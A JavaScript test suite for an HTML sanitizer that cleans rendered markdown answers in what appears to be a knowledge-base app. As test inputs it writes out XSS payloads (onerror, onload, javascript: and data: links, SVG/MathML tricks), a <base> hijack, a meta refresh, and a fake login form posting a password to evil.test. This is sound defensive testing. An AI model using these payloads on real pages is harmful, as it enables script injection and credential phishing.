import test from 'node:test'
import assert from 'node:assert/strict'

import { JSDOM } from 'jsdom'
import { marked } from 'marked'
import { markedHighlight } from 'marked-highlight'
import hljs from 'highlight.js'

import { sanitizeHtml } from '../src/utils/sanitizeHtml.js'

// The sanitizer reads the ambient `document`, so give the test process one.
// Sanitizing only makes sense with a DOM anyway (it is what the browser has).
const APP_ORIGIN = 'http://localhost:5173/'
const dom = new JSDOM('<!doctype html><html><body></body></html>', { url: APP_ORIGIN })
globalThis.document = dom.window.document

// Same pipeline as src/components/MarkdownRenderer.vue, so the tests sanitize
// the HTML the renderer actually produces.
marked.use(
  markedHighlight({
    langPrefix: 'hljs language-',
    highlight(code, lang) {
      if (lang && hljs.getLanguage(lang)) {
        return hljs.highlight(code, { language: lang }).value
      }
      return hljs.highlightAuto(code).value
    },
  })
)

marked.setOptions({
  breaks: true,
  gfm: true,
})

function render(markdown) {
  const sanitized = sanitizeHtml(marked.parse(markdown))
  document.body.innerHTML = ''
  const host = document.createElement('div')
  host.innerHTML = sanitized
  document.body.appendChild(host)
  return { sanitized, host }
}

test('an answer cannot smuggle <base> past the sanitizer', () => {
  const { sanitized, host } = render(
    ['年假天数为 10 天。', '', '<base href="https://evil.test/">', '', '[下载员工手册](/uploads/handbook.pdf)'].join('\n')
  )

  assert.equal(host.querySelectorAll('base').length, 0, '<base> must not reach the DOM')
  assert.equal(sanitized.includes('<base'), false)
  // The hijack this issue is about: every relative URL must keep resolving
  // against the app origin, not the base the answer asked for.
  assert.equal(document.baseURI, APP_ORIGIN)
  assert.equal(new URL('/api/knowledge-bases', document.baseURI).href, `${APP_ORIGIN}api/knowledge-bases`)
})

test('page-level metadata elements are removed with their content', () => {
  for (const html of [
    '<meta http-equiv="refresh" content="0;url=https://evil.test/">',
    '<link rel="stylesheet" href="https://evil.test/x.css">',
    '<style>body{display:none}</style>',
    '<title>登录已过期</title>',
    '<noscript><img src="https://evil.test/n.png"></noscript>',
    '<template><base href="https://evil.test/"></template>',
  ]) {
    const { sanitized, host } = render(html)
    for (const tag of ['base', 'meta', 'link', 'style', 'title', 'noscript', 'template', 'img']) {
      assert.equal(host.querySelectorAll(tag).length, 0, `<${tag}> of ${html} must not reach the DOM`)
    }
    // Only the wrapper marked itself added around the line may be left.
    const survivors = [...host.querySelectorAll('*')].map((node) => node.tagName.toLowerCase())
    assert.deepEqual(survivors.filter((tag) => tag !== 'p' && tag !== 'br'), [], `${html} must leave nothing behind`)
    assert.equal(sanitized.includes('evil.test'), false, `${html} must not keep its URL`)
  }
})

test('a fake login form is removed together with its copy', () => {
  const { sanitized, host } = render(
    '<form action="https://evil.test/collect" method="post">' +
      '<label>账号</label><input type="password" name="password">' +
      '<button type="submit">继续登录</button></form>'
  )

  for (const tag of ['form', 'input', 'button', 'label', 'select', 'textarea', 'option']) {
    assert.equal(host.querySelectorAll(tag).length, 0, `<${tag}> must not reach the DOM`)
  }
  assert.equal(sanitized.includes('继续登录'), false, 'the phishing copy must go with the form')
})

test('GFM task list checkboxes are dropped on purpose', () => {
  const { sanitized, host } = render('- [x] 已完成的检查项')

  assert.equal(host.querySelectorAll('input').length, 0)
  // The text survives, only the control is gone.
  assert.match(sanitized, /已完成的检查项/)
})

test('foreign namespaces cannot bring their own element semantics', () => {
  const { sanitized, host } = render(
    [
      '<svg onload="alert(1)"><script>alert(2)</script></svg>',
      '<svg><a xlink:href="javascript:alert(3)"><text>点我</text></a></svg>',
      '<svg><foreignObject><iframe src="https://evil.test/"></iframe></foreignObject></svg>',
      '<math><mtext><img src="x" onerror="alert(4)"></mtext></math>',
    ].join('\n')
  )

  for (const tag of ['svg', 'math', 'foreignobject', 'mtext', 'script', 'iframe']) {
    assert.equal(host.querySelectorAll(tag).length, 0, `<${tag}> must not reach the DOM`)
  }
  // Only the wrappers marked put around these lines (paragraph, line break) may survive.
  const survivors = [...host.querySelectorAll('*')].map((node) => node.tagName.toLowerCase())
  assert.deepEqual(survivors.filter((tag) => tag !== 'p' && tag !== 'br'), [])
  assert.equal(/on\w+=/i.test(sanitized), false)
})

test('attribute policy is unchanged: on* handlers and unsafe URLs are dropped', () => {
  const { host } = render(
    [
      '<img src="/uploads/a.png" onerror="alert(1)">',
      '<a href="javascript:alert(2)">x</a>',
      '<a href="java\tscript:alert(3)">x</a>',
      '<a href="data:text/html,<script>alert(4)</script>">x</a>',
      '<a href="/uploads/handbook.pdf">站内</a>',
      '<a href="https://example.com/docs" title="文档">外链</a>',
    ].join('\n\n')
  )

  assert.equal(/on\w+=/i.test(host.innerHTML), false)
  // The three dangerous hrefs are gone (null), the two normal ones are kept.
  const hrefs = [...host.querySelectorAll('a')].map((node) => node.getAttribute('href'))
  assert.deepEqual(hrefs, [null, null, null, '/uploads/handbook.pdf', 'https://example.com/docs'])
  assert.equal(host.querySelector('a[title]').getAttribute('title'), '文档')
  assert.equal(host.querySelector('img').getAttribute('src'), '/uploads/a.png')
})

test('attributes that only help an attacker are dropped', () => {
  const { host } = render(
    [
      '<div style="position:fixed;inset:0;background:url(https://evil.test/bg.png)">overlay</div>',
      '<img src="x" srcset="https://evil.test/2x.png 2x">',
      '<span id="app" name="app" data-anything="1" class="hljs-string">ok</span>',
    ].join('\n')
  )

  assert.equal(host.querySelectorAll('[style]').length, 0)
  assert.equal(host.querySelectorAll('[srcset]').length, 0)
  assert.equal(host.querySelectorAll('[id]').length, 0)
  assert.equal(host.querySelectorAll('[name]').length, 0)
  assert.equal(host.querySelectorAll('[data-anything]').length, 0)
  assert.equal(host.querySelector('span').getAttribute('class'), 'hljs-string')
  // Unknown element: the tag itself goes, the text stays readable.
  assert.equal(host.querySelectorAll('div').length, 0)
  assert.match(host.innerHTML, /overlay/)
})

test('legitimate answers still render as before', () => {
  const { sanitized, host } = render(
    [
      '# 标题一',
      '',
      '**加粗** 与 *斜体* 与 ~~删除线~~。',
      '',
      '| 列 A | 列 B |',
      '| :--- | ---: |',
      '| a1 | b1 |',
      '',
      '```js',
      'const answer = 42',
      '```',
      '',
      '行内 `code` 与 [站内链接](/uploads/handbook.pdf) 与 [外链](https://example.com/docs)。',
      '',
      '![图片](/uploads/a.png)',
      '',
      '> 引用',
      '',
      '- 列表项 1',
      '  1. 嵌套有序项',
    ].join('\n')
  )

  assert.equal(host.querySelectorAll('h1').length, 1)
  assert.equal(host.querySelectorAll('table th').length, 2)
  assert.equal(host.querySelector('th').getAttribute('align'), 'left')
  assert.equal(host.querySelector('th:nth-child(2)').getAttribute('align'), 'right')
  assert.equal(host.querySelectorAll('li').length, 2)
  assert.equal(host.querySelectorAll('blockquote').length, 1)
  assert.equal(host.querySelectorAll('del').length, 1)

  // Code highlighting keeps its classes, anchors and images keep their targets.
  assert.match(sanitized, /<code class="hljs language-js">/)
  assert.match(sanitized, /<span class="hljs-keyword">const<\/span>/)
  assert.equal(host.querySelector('a').getAttribute('href'), '/uploads/handbook.pdf')
  assert.equal(host.querySelector('img').getAttribute('src'), '/uploads/a.png')
  assert.equal(host.querySelector('img').getAttribute('alt'), '图片')
})

test('sanitizing is idempotent and leaves no unvetted element behind', () => {
  const payload = [
    '# 标题',
    '',
    '<base href="https://evil.test/">',
    '<form action="https://evil.test/"><input name="p"></form>',
    '',
    '**正文** 与 [链接](/uploads/a.pdf)',
  ].join('\n')

  const once = sanitizeHtml(marked.parse(payload))
  const twice = sanitizeHtml(once)
  assert.equal(twice, once)
})
